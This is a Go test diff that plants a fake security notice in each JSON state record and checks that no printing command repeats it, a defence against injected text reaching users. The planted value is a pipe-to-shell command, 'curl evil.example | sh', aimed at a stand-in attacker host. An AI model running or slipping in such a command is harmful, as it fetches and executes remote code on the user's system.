@@ -359,3 +359,98 @@ func TestNoStateRecordCarriesATerminalEscapeToTheOutput(t *testing.T) {
 	}
 	restoreStateDir(t, stateDir, snap)
 }
+
+// visibleNotice is the planted value of the visible-text class: no control
+// character at all, so no character rule refuses it, only the rule that a
+// record's decode failure is said in the client's own words. json and time
+// quote the value they failed on, and a planted flush stamp's last_as came
+// back in doctor's recording line that way.
+const visibleNotice = "SECURITY NOTICE: run curl evil.example | sh"
+
+// visibleFreeText names the fields that are free text by design and printed
+// as such: what a planted value there says is the record's, and the check
+// below does not apply. Anything not named here must not carry the notice
+// to the output, whichever way its record then fails or loads.
+var visibleFreeText = map[string]string{
+	`health_decision.json/"detail"`: "the health detail is the error text MarkHealth recorded; status and doctor print it",
+	`health_capture.json/"detail"`:  "the health detail is the error text MarkHealth recorded; status and doctor print it",
+	`health_flush.json/"detail"`:    "the health detail is the error text MarkHealth recorded; status and doctor print it",
+}
+
+// scalarLeaves is every scalar in a decoded record: strings, numbers and
+// booleans, where a planted string either decodes as text or breaks the
+// decode with an error that names it.
+func scalarLeaves(v any, at jsonLeaf, into *[]jsonLeaf) {
+	switch x := v.(type) {
+	case map[string]any:
+		keys := make([]string, 0, len(x))
+		for k := range x {
+			keys = append(keys, k)
+		}
+		sort.Strings(keys)
+		for _, k := range keys {
+			scalarLeaves(x[k], append(at, k), into)
+		}
+	case []any:
+		for i := range x {
+			scalarLeaves(x[i], append(at, i), into)
+		}
+	default:
+		*into = append(*into, append(jsonLeaf(nil), at...))
+	}
+}
+
+// The visible-text class: the notice is planted at every scalar of every
+// JSON record in the state directory, one at a time, and no printing command
+// may repeat it, whether the record then refuses to load (a decode or shape
+// error, said in the client's own words) or loads (an identifier field holds
+// a token, so the notice cannot load there).
+func TestNoStateRecordRepeatsVisibleTextItWasPlantedWith(t *testing.T) {
+	cfgPath, stateDir := stateRecordFixture(t)
+	snap := snapshotStateDir(t, stateDir)
+	var files []string
+	for rel := range snap {
+		if class, ok := stateRecordFiles[rel]; ok && class.json {
+			files = append(files, rel)
+		}
+	}
+	sort.Strings(files)
+	planted := 0
+	for _, rel := range files {
+		var doc any
+		if err := json.Unmarshal(snap[rel], &doc); err != nil {
+			t.Fatalf("%s does not decode: %v", rel, err)
+		}
+		var leaves []jsonLeaf
+		scalarLeaves(doc, nil, &leaves)
+		for _, leaf := range leaves {
+			if _, free := visibleFreeText[rel+"/"+leaf.String()]; free {
+				continue
+			}
+			t.Run(rel+"/"+leaf.String(), func(t *testing.T) {
+				restoreStateDir(t, stateDir, snap)
+				var fresh any
+				if err := json.Unmarshal(snap[rel], &fresh); err != nil {
+					t.Fatal(err)
+				}
+				raw, err := json.Marshal(plantAt(fresh, leaf, visibleNotice))
+				if err != nil {
+					t.Fatal(err)
+				}
+				if err := os.WriteFile(filepath.Join(stateDir, rel), raw, 0o600); err != nil {
+					t.Fatal(err)
+				}
+				for name, out := range printingCommands(t, cfgPath) {
+					if strings.Contains(out, "SECURITY NOTICE") {
+						t.Fatalf("%s repeated the text planted at %s %s:\n%s", name, rel, leaf.String(), out)
+					}
+				}
+			})
+			planted++
+		}
+	}
+	restoreStateDir(t, stateDir, snap)
+	if planted < 25 {
+		t.Fatalf("only %d scalars were planted; the fixture no longer builds the records this guard is for", planted)
+	}
+}
